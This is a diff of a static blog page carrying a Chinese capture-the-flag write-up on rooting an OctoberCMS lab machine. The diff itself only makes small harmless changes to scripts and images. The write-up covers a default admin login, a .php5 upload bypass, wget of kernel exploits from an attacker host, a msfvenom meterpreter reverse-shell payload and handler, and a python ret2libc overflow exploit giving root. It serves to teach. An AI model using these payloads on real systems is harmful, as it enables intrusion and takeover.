@@ -9,7 +9,22 @@
     }
     </style>
 
-  
+  <script>
+    // 强制内网 IP 识别为安全上下文
+    if (window.location.hostname !== 'localhost' && window.location.protocol === 'http:') {
+        // 尝试手动映射 crypto 属性
+        if (!window.crypto.subtle && window.crypto.webkitSubtle) {
+            window.crypto.subtle = window.crypto.webkitSubtle;
+        }
+    }
+    
+    // 终极补丁：如果还是没有 subtle，则创建一个占位符避免报错
+    // 提示：这通常能解决加载报错，但如果插件强依赖原生加密，建议执行下面的“降级”预判
+    if (!window.isSecureContext) {
+        console.warn('当前环境非安全上下文，正在尝试兼容内网加密解密...');
+    }
+</script>
+
 
 <head>
   <meta charset="UTF-8">
@@ -61,7 +76,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"192.168.126.129","root":"/","version":"1.8.7","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -238,30 +253,30 @@
 <p>结果是目录很干净，除了论坛、用户、博客三个目录，有用信息不多。</p>
 <p><a target="_blank" rel="noopener" href="http://10.10.10.16/forum">http://10.10.10.16/forum</a></p>
 <p>第三步，分析exp<br>searchsploit -m exploits&#x2F;php&#x2F;webapps&#x2F;25720.txt<br>leafpad &#x2F;root&#x2F;Desktop&#x2F;16&#x2F;25720.txt</p>
-<p>找到了后台：<code>http://10.10.10.16/backend/backend/auth/signin</code><br><img src="/2019/02/23/45397/6.PNG" srcset="/img/loading.gif"></p>
+<p>找到了后台：<code>http://10.10.10.16/backend/backend/auth/signin</code><br><img src="/2019/02/23/45397/6.PNG"></p>
 <p>admin&#x2F;admin，登陆成功</p>
-<p><img src="/2019/02/23/45397/5.PNG" srcset="/img/loading.gif"><br>尝试文件上传，txt可以上传，php不可以，PHP不可以。</p>
-<p><img src="/2019/02/23/45397/7.PNG" srcset="/img/loading.gif"><br>但是php5可以，说明是黑名单的限制方式。</p>
-<h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><p><img src="/2019/02/23/45397/8.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/02/23/45397/5.PNG"><br>尝试文件上传，txt可以上传，php不可以，PHP不可以。</p>
+<p><img src="/2019/02/23/45397/7.PNG"><br>但是php5可以，说明是黑名单的限制方式。</p>
+<h2 id="获得一个shell"><a href="#获得一个shell" class="headerlink" title="获得一个shell"></a>获得一个shell</h2><p><img src="/2019/02/23/45397/8.PNG"></p>
 <h4 id="info-enum"><a href="#info-enum" class="headerlink" title="info enum:"></a>info enum:</h4><figure class="highlight ruby"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-symbol">os:</span> <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">14.04</span> (<span class="hljs-title class_">Linux</span> <span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">78</span>-generic)<br><span class="hljs-symbol">whoami:</span> www-data<br>exist <span class="hljs-symbol">user:</span> <span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/syslog</span><span class="hljs-symbol">:/bin/false</span><br>      		<span class="hljs-symbol">harry:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:Harry</span> <span class="hljs-title class_">Varthakouris</span>,,,<span class="hljs-symbol">:/home/harry</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></div></td></tr></table></figure>
 <h2 id="trying1：检查web-config文件，查找口令"><a href="#trying1：检查web-config文件，查找口令" class="headerlink" title="trying1：检查web config文件，查找口令"></a>trying1：检查web config文件，查找口令</h2><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">grep -R pass .<br>OctoberCMSPassword!!<br><br>python -c <span class="hljs-string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></div></td></tr></table></figure>
 <p>获取bash shell，尝试用口令登陆。登陆farry用户失败。</p>
 <h2 id="trying2-尝试数据库登陆"><a href="#trying2-尝试数据库登陆" class="headerlink" title="trying2: 尝试数据库登陆"></a>trying2: 尝试数据库登陆</h2><p>发现数据库以mysql用户运行。</p>
 <figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ps</span> -ef | grep mysql<br><span class="hljs-attribute">mysql</span>     <span class="hljs-number">1197</span>     <span class="hljs-number">1</span>  <span class="hljs-number">0</span> Feb18 ?        <span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">16</span> /usr/sbin/mysqld<br><br><span class="hljs-attribute">netstat</span> -an<br><span class="hljs-attribute">unix</span>  <span class="hljs-number">2</span>     <span class="hljs-meta"> [ ACC ]     STREAM     LISTENING     10089    /var/run/mysqld/mysqld.sock</span><br></code></pre></div></td></tr></table></figure>
-<h2 id="trying3-上传sh脚本"><a href="#trying3-上传sh脚本" class="headerlink" title="trying3: 上传sh脚本"></a>trying3: 上传sh脚本</h2><p><img src="/2019/02/23/45397/1.PNG" srcset="/img/loading.gif"><br>有gcc，于是可以尝试内核漏洞<br><img src="/2019/02/23/45397/2.PNG" srcset="/img/loading.gif"></p>
+<h2 id="trying3-上传sh脚本"><a href="#trying3-上传sh脚本" class="headerlink" title="trying3: 上传sh脚本"></a>trying3: 上传sh脚本</h2><p><img src="/2019/02/23/45397/1.PNG"><br>有gcc，于是可以尝试内核漏洞<br><img src="/2019/02/23/45397/2.PNG"></p>
 <figure class="highlight d"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs d">wget http:<span class="hljs-comment">//10.10.14.7/dirty.c</span><br>wget http:<span class="hljs-comment">//10.10.14.7/dirtyc0w.c</span><br><br>wget http:<span class="hljs-comment">//10.10.14.7/chocobo_root </span><br>执行结果：i have no offsets <span class="hljs-keyword">for</span> <span class="hljs-keyword">this</span> kernel <span class="hljs-keyword">version</span>..<br></code></pre></div></td></tr></table></figure>
 <p>执行了三个exp，都失败了</p>
 <h2 id="trying4-上传msf反弹payload"><a href="#trying4-上传msf反弹payload" class="headerlink" title="trying4: 上传msf反弹payload"></a>trying4: 上传msf反弹payload</h2><p>msfconsole -r job.rc 执行监听</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload linux/x86/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 10.10.14.7<br><span class="hljs-built_in">set</span> LPORT 7766<br>run<br></code></pre></div></td></tr></table></figure>
 <p>将载荷发送到目标机，并且运行。<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&quot;10.10.14.7&quot; LPORT=7766 -f elf -o 123</code></p>
-<p><img src="/2019/02/23/45397/11.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/02/23/45397/11.PNG"></p>
 <figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span> - exploit/linux/<span class="hljs-keyword">local</span>/apport_abrt_chroot_priv_esc: The target <span class="hljs-keyword">is</span> vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span> - exploit/linux/<span class="hljs-keyword">local</span>/netfilter_priv_esc_ipv4: The target appears <span class="hljs-keyword">to</span> be vulnerable.  编译时缺少模块libc6-dev-i386，失败<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.16</span> - exploit/linux/<span class="hljs-keyword">local</span>/pkexec: The target service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>, <span class="hljs-keyword">but</span> could <span class="hljs-keyword">not</span> be validated. <br>[*] Post module execution completed<br><br><span class="hljs-keyword">set</span> SESSION <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> payload linux/x86/meterpreter/reverse_tcp<br><span class="hljs-keyword">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.7</span><br><span class="hljs-keyword">set</span> LPORT <span class="hljs-number">8899</span><br>show options<br><span class="hljs-built_in">run</span> 失败<br></code></pre></div></td></tr></table></figure>
-<h2 id="writeup-suid程序以及python-exploit编写"><a href="#writeup-suid程序以及python-exploit编写" class="headerlink" title="writeup: suid程序以及python exploit编写"></a>writeup: suid程序以及python exploit编写</h2><p>之前用脚本检查过suid权限，但是&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ovrflw，并不是常见的suid 提权程序，于是被我忽略了…<br><img src="/2019/02/23/45397/3.PNG" srcset="/img/loading.gif"></p>
+<h2 id="writeup-suid程序以及python-exploit编写"><a href="#writeup-suid程序以及python-exploit编写" class="headerlink" title="writeup: suid程序以及python exploit编写"></a>writeup: suid程序以及python exploit编写</h2><p>之前用脚本检查过suid权限，但是&#x2F;usr&#x2F;local&#x2F;bin&#x2F;ovrflw，并不是常见的suid 提权程序，于是被我忽略了…<br><img src="/2019/02/23/45397/3.PNG"></p>
 <p>ovrflw是一个二进制程序，有缓冲区溢出漏洞，可惜我还不会写利用程序。<br><code>cd /usr/local/bin;./ovrflw</code></p>
-<p><img src="/2019/02/23/45397/4.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/02/23/45397/4.PNG"></p>
 <p>overflow.py</p>
 <figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">import struct, subprocess<br>libcBase = 0xb75eb000<br>systemOffset = 0x00040310<br>binShOffset = 0x00162bac<br>libcAddress = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libcBase+systemOffset)<br>exitAddress = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, 0xd34db33f)<br>binShAddress = struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, libcBase+binShOffset)<br>payload = <span class="hljs-string">&quot;\x90&quot;</span>*112<br>payload += libcAddress<br>payload += exitAddress<br>payload += binShAddress<br>i = 0<br>while True:<br>	i += 1<br>	if i%10 == 0:<br>		print <span class="hljs-string">&quot;Attempts: &quot;</span> + str(i)<br>	subprocess.call([<span class="hljs-string">&quot;/usr/local/bin/ovrflw&quot;</span>, payload])<br></code></pre></div></td></tr></table></figure>
-<p><img src="/2019/02/23/45397/9.PNG" srcset="/img/loading.gif"></p>
+<p><img src="/2019/02/23/45397/9.PNG"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>编写python脚本，利用段错误，通过缓冲区溢出得到root权限，需要很多基础，不是一时半会儿能学会的。继续加油吧</p>
 
             </div>
@@ -399,10 +414,6 @@
 
 <!-- Plugins -->
 
-
-  
-    <script  src="/js/lazyload.js" ></script>
-  
 
 
 
